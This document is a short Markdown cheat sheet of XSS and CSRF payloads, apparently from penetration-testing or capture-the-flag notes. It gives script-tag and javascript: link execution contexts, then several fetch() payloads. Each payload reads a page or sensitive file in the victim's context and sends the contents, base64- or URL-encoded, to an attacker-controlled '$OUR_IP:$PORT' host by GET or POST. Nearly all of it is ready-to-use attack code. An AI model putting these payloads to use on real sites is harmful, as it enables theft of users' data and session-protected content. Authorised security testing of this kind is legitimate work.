# Payloads

Payloads can be leveraged from rendered file uploads and XSS/CSRF.

## Execution Contexts

**Basic**

```html
<script>
$PAYLOAD;
</script>
```

**Click Me**

```html
<a href="javascript:(function(){$PAYLOAD})()">Click here</a>
```

## CSRF Payloads

We can use these payloads to target forbidden/vulnerable content in the context of another user.

**GET (relative path, base64)**

```js
fetch('/?$PARAM=$VALUE')
	.then(r=>r.text())
	.then(d=>fetch('http://$OUR_IP:$PORT/c='+btoa(d)))

fetch('/?$PARAM=$VALUE').then(r=>r.text()).then(d=>fetch('http://$OUR_IP:$PORT/c='+btoa(d)))
```

**GET (absolute path, urlencoded)**

```js
fetch('http://example.com/sensitive_file.txt')
    .then(r=>r.text())
    .then(d=>fetch('http://$OUR_IP:$PORT/?c='+encodeURIComponent(d)))

fetch('http://$TARGET:$PORT/sensitive_file.txt').then(r=>r.text()).then(d=>fetch('http://$OUR_IP:$PORT/?c='+encodeURIComponent(d)))
```

**POST (relative path, base64)**

```js
fetch('/?PARAM=$VALUE')
    .then(r=>r.text())
    .then(d=>fetch('http://$OUR_IP:$PORT/c', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'c='+btoa(d)
    }))

fetch('/?PARAM=$VALUE').then(r=>r.text()).then(d=>fetch('http://$OUR_IP:$PORT/c',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded',},body:'c='+btoa(d)}))
```

**POST (absolute path, urlencoded)**

```js
fetch('http://example.com/sensitive_file.txt')
    .then(r=>r.text())
    .then(d=>fetch('http://$OUR_IP:$PORT/c', {
	    method: 'POST',
		headers: {
		    'Content-Type': 'application/x-www-form-urlencoded',
	    },
	    body: 'c='+encodeURIComponent(d)
	}))

fetch('http://$TARGET:$PORT/sensitive_file.txt').then(r=>r.text()).then(d=>fetch('http://$OUR_IP:$PORT/c',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded',},body:'c='+encodeURIComponent(d)}))
```
